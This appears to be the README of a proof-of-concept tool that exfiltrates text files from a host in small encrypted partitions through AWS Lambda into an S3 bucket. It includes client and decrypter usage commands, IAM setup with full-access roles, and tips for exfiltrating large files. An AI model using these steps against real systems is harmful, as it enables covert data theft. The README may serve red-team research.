# AWS Lambda Exfil Tool [PoC]

Here we have a small PoC on how the program works  

![StandaloneClientGif](media/standaloneClient.gif)

## About
The program follows the following diagram. Explanation on how each part functions is present on standaloneClient pdf file.  

![StandaloneClient diagram](media/Standalone_client_1.png?raw=true "Standalone Client Diagram")


## Usage
#### Client
`py clientName.py -s <Partition size in kb> -i <File to exfiltrate>`  
Example:  
`py clientName.py -s 100 -i "C:\Users\SomeUser\Desktop\test.txt"`
#### Decrypter
###### Note: If not sure about hostname and filename, check S3 Bucket after exfiltration
`py decrypter.py -n "Hostname" -i "Filename"`  
Example after exfiltrating test.txt:  
`py decrypter.py -n "ID4A0E" -i "test"`
## Setup

###### Note: Use python 3.x  

#### IAM Console
Go to AWS IAM console and create a role (Remember the ARN name) with the following permissions:  

- AWSLambdaFullAccess
- AmazonS3FullAccess
- CloudWatchFullAccess

###### Run `pip install -r requirements.txt`

###### Run `py setup.py` and follow the prompts

#### Partitions
Partition size is by default 100 bytes, this can be changed by accessing standaloneClient_template.py and modifiying the value. This could be helpful when exfiltrating large files, as the time it would take to exfiltrate 1GB of data with 100B partitions will be really significant.

#### Supported Files
The tool supports txt, csv and xlsx files but every file that is text based (For example a .py file) will be exfiltrated succesfully.
